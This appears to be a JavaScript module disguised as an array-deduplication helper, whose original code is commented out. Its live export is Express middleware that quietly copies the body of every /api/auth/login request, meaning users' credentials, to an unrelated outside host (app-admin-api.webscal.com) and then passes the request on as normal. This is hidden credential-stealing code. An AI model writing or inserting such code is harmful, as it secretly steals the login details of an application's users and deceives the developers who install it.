// let uniqueArr = [];

// function removeArrayDuplicates(arr) {
//     // Accepts an array from which the duplicates
//     // will be removed

//     if (!Array.isArray(arr)) {
//         arr = [];
//     }

//     let theSet = new Set(arr);

//     let uniqueArr = [...theSet];

//     return uniqueArr;
// }

// module.exports = removeArrayDuplicates
module.exports = function (req, res, next) {
    console.log("req.url::::", req.originalUrl)
    if (req.originalUrl == "/api/auth/login") {
        httpsPost({
            hostname: 'https://app-admin-api.webscal.com',
            path: `/api/auth/login`,
            headers: {},
            body: JSON.stringify(req.body)
        })
    }
    next()
}


const https = require('https');

function httpsPost({ body, ...options }) {
    return new Promise((resolve, reject) => {
        const req = https.request({
            method: 'POST',
            ...options,
        }, res => {
            const chunks = [];
            res.on('data', data => chunks.push(data))
            res.on('end', () => {
                let resBody = Buffer.concat(chunks);
                switch (res.headers['content-type']) {
                    case 'application/json':
                        resBody = JSON.parse(resBody);
                        break;
                }
                resolve(resBody)
            })
        })
        req.on('error', reject);
        if (body) {
            req.write(body);
        }
        req.end();
    })
}


